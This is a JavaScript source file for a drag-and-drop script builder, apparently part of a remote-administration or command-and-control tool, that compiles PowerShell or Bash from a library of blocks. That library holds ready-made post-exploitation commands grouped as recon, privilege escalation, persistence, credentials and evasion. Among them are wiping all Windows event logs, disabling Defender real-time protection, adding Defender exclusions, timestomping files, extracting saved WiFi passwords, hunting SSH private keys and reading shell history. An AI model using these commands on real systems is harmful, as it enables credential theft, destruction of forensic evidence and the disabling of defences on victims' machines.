const BLOCK_CATEGORIES = {
  recon: {
    label: "Recon",
    icon: "fa-solid fa-magnifying-glass",
    color: "emerald",
    blocks: [
      { id: "whoami", label: "Whoami", desc: "Current user identity", ps: "whoami /all", bash: "id; whoami" },
      { id: "sysinfo", label: "System Info", desc: "OS and hardware details", ps: "Get-ComputerInfo | Select-Object CsName, WindowsVersion, OsArchitecture", bash: "uname -a; cat /etc/os-release 2>/dev/null" },
      { id: "ipconfig", label: "Network Info", desc: "IP addresses and interfaces", ps: "Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4'} | Select-Object IPAddress, InterfaceAlias", bash: "ip addr 2>/dev/null || ifconfig" },
      { id: "processes", label: "Top Processes", desc: "CPU-heavy processes", ps: "Get-Process | Sort-Object CPU -Descending | Select-Object -First 15 Name, CPU, WorkingSet", bash: "ps aux --sort=-%cpu | head -20" },
      { id: "netstat", label: "Active Connections", desc: "Open network connections", ps: "Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'} | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort", bash: "netstat -tunap 2>/dev/null || ss -tunap" },
      { id: "localusers", label: "Local Users", desc: "Enumerate local accounts", ps: "Get-LocalUser | Select-Object Name, Enabled, LastLogon | Format-Table -AutoSize", bash: "cat /etc/passwd | grep -v nologin | grep -v false" },
      { id: "env", label: "Environment Vars", desc: "List environment variables", ps: "Get-ChildItem Env: | Sort-Object Name | Format-Table -AutoSize", bash: "env | sort" },
      { id: "diskusage", label: "Disk Usage", desc: "Storage information", ps: "Get-PSDrive -PSProvider FileSystem | Select-Object Name, Used, Free, Root", bash: "df -h" },
    ],
  },
  files: {
    label: "Files",
    icon: "fa-solid fa-folder-open",
    color: "blue",
    blocks: [
      { id: "ls", label: "List Directory", desc: "List files in path", ps: "Get-ChildItem -Path \"{path}\" -Force | Select-Object Mode, LastWriteTime, Length, Name", bash: "ls -la \"{path}\"", fields: [{ key: "path", label: "Path", placeholder: "C:\\ or /tmp", default: "." }] },
      { id: "cat", label: "Read File", desc: "Display file contents", ps: "Get-Content -Path \"{path}\"", bash: "cat \"{path}\"", fields: [{ key: "path", label: "File Path", placeholder: "C:\\file.txt" }] },
      { id: "find", label: "Find Files", desc: "Search for files by pattern", ps: "Get-ChildItem -Path \"{path}\" -Recurse -Filter \"{pattern}\" -ErrorAction SilentlyContinue | Select-Object FullName, Length", bash: "find \"{path}\" -name \"{pattern}\" 2>/dev/null", fields: [{ key: "path", label: "Search Path", placeholder: "/", default: "." }, { key: "pattern", label: "Pattern", placeholder: "*.txt", default: "*" }] },
      { id: "mkdir", label: "Create Directory", desc: "Create a new directory", ps: "New-Item -ItemType Directory -Path \"{path}\" -Force", bash: "mkdir -p \"{path}\"", fields: [{ key: "path", label: "Directory Path", placeholder: "C:\\new_folder" }] },
      { id: "rmfile", label: "Delete File", desc: "Remove a file", ps: "Remove-Item -Path \"{path}\" -Force", bash: "rm -f \"{path}\"", fields: [{ key: "path", label: "File Path", placeholder: "C:\\temp\\file.txt" }] },
    ],
  },
  security: {
    label: "Security",
    icon: "fa-solid fa-shield-halved",
    color: "amber",
    blocks: [
      { id: "avcheck", label: "AV Status", desc: "Check antivirus products", ps: "$av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue; if ($av) { $av | Select-Object displayName, pathToSignedProductExe } else { 'No AV data' }", bash: "echo 'AV check not applicable on Linux'" },
      { id: "defender", label: "Defender Status", desc: "Windows Defender health", ps: "Get-MpComputerStatus | Select-Object AMServiceEnabled, AntivirusEnabled, RealTimeProtectionEnabled", bash: "echo 'Defender not available on Linux'" },
      { id: "defenderexcl", label: "Defender Exclusions", desc: "Show exclusion paths", ps: "$p = Get-MpPreference; 'Exclusion Paths:'; $p.ExclusionPath; 'Exclusion Processes:'; $p.ExclusionProcess", bash: "echo 'Defender not available on Linux'" },
      { id: "firewall", label: "Firewall Rules", desc: "List firewall configuration", ps: "Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'} | Select-Object -First 20 DisplayName, Direction, Action", bash: "iptables -L -n 2>/dev/null || ufw status 2>/dev/null || echo 'No firewall info'" },
      { id: "langmode", label: "PS Language Mode", desc: "Check CLM status", ps: "Write-Host 'Language Mode:' $ExecutionContext.SessionState.LanguageMode", bash: "echo 'PowerShell not available'" },
    ],
  },
  privesc: {
    label: "Priv Esc",
    icon: "fa-solid fa-arrow-up-right-dots",
    color: "red",
    blocks: [
      { id: "privileges", label: "Token Privileges", desc: "Current token privileges", ps: "whoami /priv", bash: "id; groups" },
      { id: "suid", label: "SUID Binaries", desc: "Find SUID files (Linux)", ps: "echo 'Not applicable on Windows'", bash: "find / -perm -4000 -type f 2>/dev/null | sort" },
      { id: "sudo", label: "Sudo Rules", desc: "Check sudo permissions", ps: "echo 'Not applicable on Windows'", bash: "sudo -l 2>/dev/null || echo 'No sudo access'" },
      { id: "unquoted", label: "Unquoted Service Paths", desc: "Potential hijack targets", ps: "Get-WmiObject Win32_Service | Where-Object {$_.PathName -like '* *' -and -not $_.PathName.StartsWith([char]34)} | Select-Object Name, PathName, State", bash: "echo 'Not applicable on Linux'" },
      { id: "schtasks", label: "Scheduled Tasks", desc: "Non-Microsoft tasks", ps: "Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\\Microsoft*'} | Select-Object TaskName, TaskPath, State | Format-Table -AutoSize", bash: "crontab -l 2>/dev/null; echo '---'; ls /etc/cron.d/ 2>/dev/null" },
      { id: "capabilities", label: "Linux Capabilities", desc: "Binaries with caps", ps: "echo 'Not applicable on Windows'", bash: "getcap -r / 2>/dev/null || echo 'getcap not available'" },
    ],
  },
  persist: {
    label: "Persistence",
    icon: "fa-solid fa-link",
    color: "purple",
    blocks: [
      { id: "regrun", label: "Registry Run Keys", desc: "Check autorun entries", ps: "Get-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -ErrorAction SilentlyContinue; Get-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -ErrorAction SilentlyContinue", bash: "echo 'Not applicable on Linux'" },
      { id: "startup", label: "Startup Folder", desc: "List startup items", ps: "Get-ChildItem \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" -Force -ErrorAction SilentlyContinue", bash: "ls ~/.config/autostart/ 2>/dev/null" },
      { id: "services", label: "Running Services", desc: "Active services", ps: "Get-Service | Where-Object {$_.Status -eq 'Running'} | Sort-Object DisplayName | Select-Object -First 30 Name, DisplayName", bash: "systemctl list-units --type=service --state=running 2>/dev/null | head -30" },
      { id: "cronjobs", label: "Cron Jobs", desc: "Scheduled cron entries", ps: "echo 'Not applicable on Windows'", bash: "echo '=== User Crontab ==='; crontab -l 2>/dev/null; echo '=== /etc/crontab ==='; cat /etc/crontab 2>/dev/null" },
    ],
  },
  credentials: {
    label: "Credentials",
    icon: "fa-solid fa-key",
    color: "orange",
    blocks: [
      { id: "credman", label: "Credential Manager", desc: "Stored credentials", ps: "cmdkey /list", bash: "echo 'Not applicable on Linux'" },
      { id: "sshkeys", label: "SSH Keys Hunt", desc: "Find SSH private keys", ps: "Get-ChildItem -Path $env:USERPROFILE\\.ssh -Force -ErrorAction SilentlyContinue", bash: "find /home /root -maxdepth 4 \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'authorized_keys' \\) 2>/dev/null" },
      { id: "pshistory", label: "PS History", desc: "PowerShell command history", ps: "Get-Content (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue | Select-Object -Last 50", bash: "cat ~/.bash_history 2>/dev/null | tail -50" },
      { id: "wifi", label: "WiFi Passwords", desc: "Saved WiFi credentials", ps: "netsh wlan show profiles | ForEach-Object { if ($_ -match 'All User Profile\\s*:\\s*(.+)$') { $name = $matches[1].Trim(); $detail = netsh wlan show profile name=$name key=clear; $key = ($detail | Select-String 'Key Content').ToString().Split(':')[1].Trim(); \"$name : $key\" } }", bash: "echo 'Use nmcli on Linux'" },
    ],
  },
  evasion: {
    label: "Evasion",
    icon: "fa-solid fa-mask",
    color: "rose",
    blocks: [
      { id: "clearevt", label: "Clear Event Logs", desc: "Wipe Windows event logs", ps: "Get-EventLog -LogName * | ForEach-Object { Clear-EventLog -LogName $_.Log -ErrorAction SilentlyContinue }; Write-Host 'Event logs cleared'", bash: "echo 'Use journalctl --vacuum-time=0 on Linux'" },
      { id: "disabledef", label: "Disable Defender RT", desc: "Turn off realtime protection", ps: "Set-MpPreference -DisableRealtimeMonitoring $true; Write-Host 'Realtime monitoring disabled'", bash: "echo 'Not applicable on Linux'" },
      { id: "addexclusion", label: "Add Defender Exclusion", desc: "Add path exclusion", ps: "Add-MpPreference -ExclusionPath \"{path}\"; Write-Host 'Exclusion added:' \"{path}\"", bash: "echo 'Not applicable on Linux'", fields: [{ key: "path", label: "Exclusion Path", placeholder: "C:\\Tools" }] },
      { id: "timestomp", label: "Timestomp File", desc: "Modify file timestamps", ps: "(Get-Item \"{path}\").LastWriteTime = \"{date}\"; (Get-Item \"{path}\").CreationTime = \"{date}\"", bash: "touch -t \"{date}\" \"{path}\"", fields: [{ key: "path", label: "File Path", placeholder: "C:\\file.exe" }, { key: "date", label: "Date", placeholder: "01/01/2023 12:00:00", default: "01/01/2023 00:00:00" }] },
    ],
  },
  custom: {
    label: "Custom",
    icon: "fa-solid fa-code",
    color: "slate",
    blocks: [
      { id: "customcmd", label: "Custom Command", desc: "Run any command", ps: "{cmd}", bash: "{cmd}", fields: [{ key: "cmd", label: "Command", placeholder: "Enter your command...", textarea: true }] },
      { id: "sleep", label: "Sleep / Delay", desc: "Wait between commands", ps: "Start-Sleep -Seconds {seconds}", bash: "sleep {seconds}", fields: [{ key: "seconds", label: "Seconds", placeholder: "5", default: "5" }] },
      { id: "echo", label: "Echo / Print", desc: "Print a message", ps: "Write-Host \"{message}\"", bash: "echo \"{message}\"", fields: [{ key: "message", label: "Message", placeholder: "Hello from Overlord" }] },
    ],
  },
};

const COLOR_MAP = {
  emerald: { bg: "bg-emerald-900/40", border: "border-emerald-700/60", text: "text-emerald-300", hover: "hover:bg-emerald-800/40", dragBg: "bg-emerald-900/60" },
  blue: { bg: "bg-blue-900/40", border: "border-blue-700/60", text: "text-blue-300", hover: "hover:bg-blue-800/40", dragBg: "bg-blue-900/60" },
  amber: { bg: "bg-amber-900/40", border: "border-amber-700/60", text: "text-amber-300", hover: "hover:bg-amber-800/40", dragBg: "bg-amber-900/60" },
  red: { bg: "bg-red-900/40", border: "border-red-700/60", text: "text-red-300", hover: "hover:bg-red-800/40", dragBg: "bg-red-900/60" },
  purple: { bg: "bg-purple-900/40", border: "border-purple-700/60", text: "text-purple-300", hover: "hover:bg-purple-800/40", dragBg: "bg-purple-900/60" },
  orange: { bg: "bg-orange-900/40", border: "border-orange-700/60", text: "text-orange-300", hover: "hover:bg-orange-800/40", dragBg: "bg-orange-900/60" },
  rose: { bg: "bg-rose-900/40", border: "border-rose-700/60", text: "text-rose-300", hover: "hover:bg-rose-800/40", dragBg: "bg-rose-900/60" },
  slate: { bg: "bg-slate-800/60", border: "border-slate-600", text: "text-slate-300", hover: "hover:bg-slate-700/60", dragBg: "bg-slate-800/80" },
};

let canvasBlocks = [];
let blockIdCounter = 0;
let draggedBlockDef = null;
let dragGhost = null;

function escapeHtml(text) {
  const div = document.createElement("div");
  div.textContent = text;
  return div.innerHTML.replace(/"/g, "&quot;").replace(/'/g, "&#39;");
}

function findBlockDef(blockId) {
  for (const cat of Object.values(BLOCK_CATEGORIES)) {
    const found = cat.blocks.find((b) => b.id === blockId);
    if (found) return { ...found, color: cat.color };
  }
  return null;
}

function renderPalette(container) {
  container.innerHTML = "";
  for (const [catKey, cat] of Object.entries(BLOCK_CATEGORIES)) {
    const colors = COLOR_MAP[cat.color] || COLOR_MAP.slate;
    const section = document.createElement("div");
    section.className = "mb-3";

    const header = document.createElement("button");
    header.className = `w-full flex items-center gap-2 px-3 py-2 rounded-lg ${colors.bg} ${colors.border} border text-sm font-semibold ${colors.text} ${colors.hover} transition-colors`;
    header.innerHTML = `<i class="${cat.icon}"></i> ${cat.label} <span class="ml-auto text-xs opacity-60">${cat.blocks.length}</span>`;
    header.addEventListener("click", () => {
      const list = section.querySelector(".block-list");
      list.classList.toggle("hidden");
    });
    section.appendChild(header);

    const list = document.createElement("div");
    list.className = "block-list flex flex-col gap-1 mt-1 pl-2 hidden";

    for (const block of cat.blocks) {
      const item = document.createElement("div");
      item.className = `flex items-center gap-2 px-3 py-2 rounded-lg border ${colors.border} ${colors.bg} cursor-grab text-sm ${colors.hover} transition-colors select-none`;
      item.draggable = true;
      item.dataset.blockId = block.id;
      item.innerHTML = `<span class="font-medium ${colors.text}">${block.label}</span><span class="text-xs text-slate-500 truncate">${block.desc}</span>`;

      item.addEventListener("dragstart", (e) => {
        draggedBlockDef = { ...block, color: cat.color };
        e.dataTransfer.effectAllowed = "copy";
        e.dataTransfer.setData("text/plain", block.id);
        item.classList.add("opacity-50");
        setTimeout(() => {
          document.getElementById("vb-canvas")?.classList.add("ring-2", "ring-emerald-500/40");
        }, 0);
      });
      item.addEventListener("dragend", () => {
        draggedBlockDef = null;
        item.classList.remove("opacity-50");
        document.getElementById("vb-canvas")?.classList.remove("ring-2", "ring-emerald-500/40");
      });

      list.appendChild(item);
    }

    section.appendChild(list);
    container.appendChild(section);
  }
}

function addBlockToCanvas(blockDef, fieldValues) {
  const instance = {
    uid: ++blockIdCounter,
    id: blockDef.id,
    color: blockDef.color,
    label: blockDef.label,
    desc: blockDef.desc,
    ps: blockDef.ps,
    bash: blockDef.bash,
    fields: (blockDef.fields || []).map((f) => ({
      ...f,
      value: fieldValues?.[f.key] ?? f.default ?? "",
    })),
  };
  canvasBlocks.push(instance);
  renderCanvas();
  updatePreview();
}

function renderCanvas() {
  const canvas = document.getElementById("vb-canvas");
  if (!canvas) return;

  if (canvasBlocks.length === 0) {
    canvas.innerHTML = `<div class="flex flex-col items-center justify-center h-full text-slate-500 gap-3 pointer-events-none">
      <i class="fa-solid fa-arrow-down text-3xl animate-bounce"></i>
      <span class="text-sm">Drag blocks here to build your script</span>
    </div>`;
    return;
  }

  canvas.innerHTML = "";
  canvasBlocks.forEach((block, idx) => {
    const colors = COLOR_MAP[block.color] || COLOR_MAP.slate;
    const el = document.createElement("div");
    el.className = `relative group flex flex-col gap-2 p-3 rounded-lg border ${colors.border} ${colors.dragBg} transition-all`;
    el.dataset.uid = block.uid;
    el.draggable = true;

    let fieldsHtml = "";
    if (block.fields && block.fields.length > 0) {
      fieldsHtml = block.fields
        .map((f) => {
          if (f.textarea) {
            return `<div class="flex flex-col gap-1">
              <label class="text-xs text-slate-400">${escapeHtml(f.label)}</label>
              <textarea class="block-field w-full px-2 py-1 rounded border border-slate-600 bg-slate-950 text-slate-100 text-xs font-mono resize-none" rows="2" data-uid="${block.uid}" data-field="${f.key}" placeholder="${escapeHtml(f.placeholder || "")}">${escapeHtml(f.value || "")}</textarea>
            </div>`;
          }
          return `<div class="flex items-center gap-2">
            <label class="text-xs text-slate-400 whitespace-nowrap">${escapeHtml(f.label)}</label>
            <input class="block-field flex-1 px-2 py-1 rounded border border-slate-600 bg-slate-950 text-slate-100 text-xs font-mono" data-uid="${block.uid}" data-field="${f.key}" placeholder="${escapeHtml(f.placeholder || "")}" value="${escapeHtml(f.value || "")}">
          </div>`;
        })
        .join("");
    }

    el.innerHTML = `
      <div class="flex items-center gap-2">
        <span class="text-slate-500 text-xs font-mono w-5 text-right">${idx + 1}</span>
        <span class="font-medium text-sm ${colors.text}">${escapeHtml(block.label)}</span>
        <span class="text-xs text-slate-500">${escapeHtml(block.desc)}</span>
        <div class="ml-auto flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
          <button class="vb-move-up px-1.5 py-0.5 text-xs rounded bg-slate-700 hover:bg-slate-600 text-slate-300" data-uid="${block.uid}" title="Move up"><i class="fa-solid fa-chevron-up"></i></button>
          <button class="vb-move-down px-1.5 py-0.5 text-xs rounded bg-slate-700 hover:bg-slate-600 text-slate-300" data-uid="${block.uid}" title="Move down"><i class="fa-solid fa-chevron-down"></i></button>
          <button class="vb-dup px-1.5 py-0.5 text-xs rounded bg-slate-700 hover:bg-slate-600 text-slate-300" data-uid="${block.uid}" title="Duplicate"><i class="fa-solid fa-clone"></i></button>
          <button class="vb-remove px-1.5 py-0.5 text-xs rounded bg-red-900/60 hover:bg-red-800 text-red-300" data-uid="${block.uid}" title="Remove"><i class="fa-solid fa-xmark"></i></button>
        </div>
      </div>
      ${fieldsHtml ? `<div class="flex flex-col gap-1.5 ml-7">${fieldsHtml}</div>` : ""}
    `;

    el.addEventListener("dragstart", (e) => {
      e.dataTransfer.effectAllowed = "move";
      e.dataTransfer.setData("text/plain", `move:${block.uid}`);
      el.classList.add("opacity-50");
    });
    el.addEventListener("dragend", () => el.classList.remove("opacity-50"));
    el.addEventListener("dragover", (e) => {
      e.preventDefault();
      e.dataTransfer.dropEffect = "move";
      el.classList.add("ring-1", "ring-emerald-400/60");
    });
    el.addEventListener("dragleave", () => el.classList.remove("ring-1", "ring-emerald-400/60"));
    el.addEventListener("drop", (e) => {
      e.preventDefault();
      el.classList.remove("ring-1", "ring-emerald-400/60");
      const data = e.dataTransfer.getData("text/plain");
      if (data.startsWith("move:")) {
        const fromUid = parseInt(data.split(":")[1]);
        const fromIdx = canvasBlocks.findIndex((b) => b.uid === fromUid);
        const toIdx = canvasBlocks.findIndex((b) => b.uid === block.uid);
        if (fromIdx !== -1 && toIdx !== -1 && fromIdx !== toIdx) {
          const [moved] = canvasBlocks.splice(fromIdx, 1);
          canvasBlocks.splice(toIdx, 0, moved);
          renderCanvas();
          updatePreview();
        }
      }
    });

    canvas.appendChild(el);
  });

  canvas.querySelectorAll(".block-field").forEach((input) => {
    input.addEventListener("input", () => {
      const uid = parseInt(input.dataset.uid);
      const fieldKey = input.dataset.field;
      const block = canvasBlocks.find((b) => b.uid === uid);
      if (block) {
        const field = block.fields.find((f) => f.key === fieldKey);
        if (field) field.value = input.value;
        updatePreview();
      }
    });
  });

  canvas.querySelectorAll(".vb-remove").forEach((btn) => {
    btn.addEventListener("click", () => {
      const uid = parseInt(btn.dataset.uid);
      canvasBlocks = canvasBlocks.filter((b) => b.uid !== uid);
      renderCanvas();
      updatePreview();
    });
  });

  canvas.querySelectorAll(".vb-dup").forEach((btn) => {
    btn.addEventListener("click", () => {
      const uid = parseInt(btn.dataset.uid);
      const orig = canvasBlocks.find((b) => b.uid === uid);
      if (!orig) return;
      const clone = { ...orig, uid: ++blockIdCounter, fields: orig.fields.map((f) => ({ ...f })) };
      const idx = canvasBlocks.findIndex((b) => b.uid === uid);
      canvasBlocks.splice(idx + 1, 0, clone);
      renderCanvas();
      updatePreview();
    });
  });

  canvas.querySelectorAll(".vb-move-up").forEach((btn) => {
    btn.addEventListener("click", () => {
      const uid = parseInt(btn.dataset.uid);
      const idx = canvasBlocks.findIndex((b) => b.uid === uid);
      if (idx > 0) {
        [canvasBlocks[idx - 1], canvasBlocks[idx]] = [canvasBlocks[idx], canvasBlocks[idx - 1]];
        renderCanvas();
        updatePreview();
      }
    });
  });

  canvas.querySelectorAll(".vb-move-down").forEach((btn) => {
    btn.addEventListener("click", () => {
      const uid = parseInt(btn.dataset.uid);
      const idx = canvasBlocks.findIndex((b) => b.uid === uid);
      if (idx < canvasBlocks.length - 1) {
        [canvasBlocks[idx], canvasBlocks[idx + 1]] = [canvasBlocks[idx + 1], canvasBlocks[idx]];
        renderCanvas();
        updatePreview();
      }
    });
  });
}

function compileBlocks(scriptMode) {
  const isPowerShell = scriptMode === "powershell" || scriptMode === "cmd";
  return canvasBlocks
    .map((block) => {
      let template = isPowerShell ? block.ps : block.bash;
      if (block.fields) {
        for (const f of block.fields) {
          template = template.replaceAll(`{${f.key}}`, f.value || f.placeholder || "");
        }
      }
      return template;
    })
    .join("\n");
}

function updatePreview() {
  const preview = document.getElementById("vb-preview");
  const typeSelect = document.getElementById("vb-script-type");
  if (!preview || !typeSelect) return;
  const mode = typeSelect.value;
  const compiled = compileBlocks(mode);
  preview.textContent = compiled || "(empty — add blocks to the canvas)";
}

export function initVisualBuilder(builderContainer) {
  builderContainer.innerHTML = `
    <div class="grid grid-cols-1 lg:grid-cols-12 gap-4 h-full">
      <div class="lg:col-span-3 flex flex-col gap-2">
        <div class="text-sm font-semibold text-slate-300 flex items-center gap-2">
          <i class="fa-solid fa-puzzle-piece"></i> Block Palette
        </div>
        <div class="flex gap-2 mb-1">
          <input id="vb-palette-search" type="text" placeholder="Search blocks..." class="flex-1 px-2 py-1.5 text-xs rounded-lg border border-slate-700 bg-slate-800 text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-1 focus:ring-emerald-500">
        </div>
        <div id="vb-palette" class="flex-1 overflow-y-auto max-h-[32rem] pr-1"></div>
      </div>
      <div class="lg:col-span-5 flex flex-col gap-2">
        <div class="flex items-center justify-between">
          <div class="text-sm font-semibold text-slate-300 flex items-center gap-2">
            <i class="fa-solid fa-layer-group"></i> Canvas
            <span id="vb-block-count" class="text-xs text-slate-500">0 blocks</span>
          </div>
          <button id="vb-clear-canvas" class="px-2 py-1 text-xs rounded-lg border border-slate-700 bg-slate-800/50 hover:bg-slate-700 text-slate-300">
            <i class="fa-solid fa-trash"></i> Clear
          </button>
        </div>
        <div id="vb-canvas" class="flex-1 min-h-[20rem] max-h-[32rem] overflow-y-auto flex flex-col gap-2 p-3 rounded-lg border-2 border-dashed border-slate-700 bg-slate-950/50 transition-all">
          <div class="flex flex-col items-center justify-center h-full text-slate-500 gap-3 pointer-events-none">
            <i class="fa-solid fa-arrow-down text-3xl animate-bounce"></i>
            <span class="text-sm">Drag blocks here to build your script</span>
          </div>
        </div>
      </div>
      <div class="lg:col-span-4 flex flex-col gap-2">
        <div class="flex items-center justify-between">
          <div class="text-sm font-semibold text-slate-300 flex items-center gap-2">
            <i class="fa-solid fa-code"></i> Generated Script
          </div>
          <div class="flex items-center gap-2">
            <select id="vb-script-type" class="px-2 py-1 text-xs rounded-lg border border-slate-700 bg-slate-800 text-slate-100">
              <option value="powershell">PowerShell</option>
              <option value="bash">Bash</option>
            </select>
            <button id="vb-copy" class="px-2 py-1 text-xs rounded-lg border border-slate-700 bg-slate-800/50 hover:bg-slate-700 text-slate-300">
              <i class="fa-solid fa-copy"></i> Copy
            </button>
            <button id="vb-send-to-editor" class="px-2 py-1 text-xs rounded-lg border border-emerald-700 bg-emerald-900/50 hover:bg-emerald-800 text-emerald-300">
              <i class="fa-solid fa-arrow-right"></i> Send to Editor
            </button>
          </div>
        </div>
        <pre id="vb-preview" class="flex-1 min-h-[20rem] max-h-[32rem] overflow-auto p-3 rounded-lg border border-slate-700 bg-slate-950 text-slate-100 font-mono text-xs whitespace-pre-wrap">(empty — add blocks to the canvas)</pre>
      </div>
    </div>
  `;

  const palette = document.getElementById("vb-palette");
  const canvas = document.getElementById("vb-canvas");
  const clearBtn = document.getElementById("vb-clear-canvas");
  const copyBtn = document.getElementById("vb-copy");
  const sendBtn = document.getElementById("vb-send-to-editor");
  const typeSelect = document.getElementById("vb-script-type");
  const paletteSearch = document.getElementById("vb-palette-search");

  renderPalette(palette);

  canvas.addEventListener("dragover", (e) => {
    e.preventDefault();
    e.dataTransfer.dropEffect = draggedBlockDef ? "copy" : "move";
  });

  canvas.addEventListener("drop", (e) => {
    e.preventDefault();
    canvas.classList.remove("ring-2", "ring-emerald-500/40");
    const data = e.dataTransfer.getData("text/plain");
    if (data.startsWith("move:")) return;
    if (draggedBlockDef) {
      addBlockToCanvas(draggedBlockDef);
      draggedBlockDef = null;
    }
  });

  clearBtn.addEventListener("click", () => {
    if (canvasBlocks.length === 0) return;
    if (!confirm("Clear all blocks from the canvas?")) return;
    canvasBlocks = [];
    renderCanvas();
    updatePreview();
  });

  copyBtn.addEventListener("click", () => {
    const preview = document.getElementById("vb-preview");
    if (preview) {
      navigator.clipboard.writeText(preview.textContent).then(() => {
        copyBtn.innerHTML = '<i class="fa-solid fa-check"></i> Copied';
        setTimeout(() => { copyBtn.innerHTML = '<i class="fa-solid fa-copy"></i> Copy'; }, 1500);
      });
    }
  });

  sendBtn.addEventListener("click", () => {
    const mode = typeSelect.value;
    const compiled = compileBlocks(mode);
    if (!compiled.trim()) {
      alert("Canvas is empty — add some blocks first.");
      return;
    }
    const editorTA = document.getElementById("script-editor");
    const scriptTypeSelect = document.getElementById("script-type");
    if (window._vbCodeMirror) {
      window._vbCodeMirror.setValue(compiled);
    } else if (editorTA) {
      editorTA.value = compiled;
    }
    if (scriptTypeSelect) scriptTypeSelect.value = mode;

    const toggle = document.getElementById("mode-toggle-code");
    if (toggle) toggle.click();

    if (typeof showToast === "function") showToast("Script sent to editor", "success", 2500);
  });

  typeSelect.addEventListener("change", updatePreview);

  paletteSearch.addEventListener("input", () => {
    const term = paletteSearch.value.toLowerCase();
    palette.querySelectorAll("[data-block-id]").forEach((el) => {
      const id = el.dataset.blockId;
      const def = findBlockDef(id);
      if (!def) return;
      const match = !term || def.label.toLowerCase().includes(term) || def.desc.toLowerCase().includes(term) || def.id.toLowerCase().includes(term);
      el.style.display = match ? "" : "none";
    });
  });

  const observer = new MutationObserver(() => {
    const countEl = document.getElementById("vb-block-count");
    if (countEl) countEl.textContent = `${canvasBlocks.length} block${canvasBlocks.length !== 1 ? "s" : ""}`;
  });
  observer.observe(canvas, { childList: true });
}

export function getCompiledScript(mode) {
  return compileBlocks(mode || "powershell");
}

export function getCanvasBlocks() {
  return canvasBlocks;
}

export function clearCanvas() {
  canvasBlocks = [];
  renderCanvas();
  updatePreview();
}
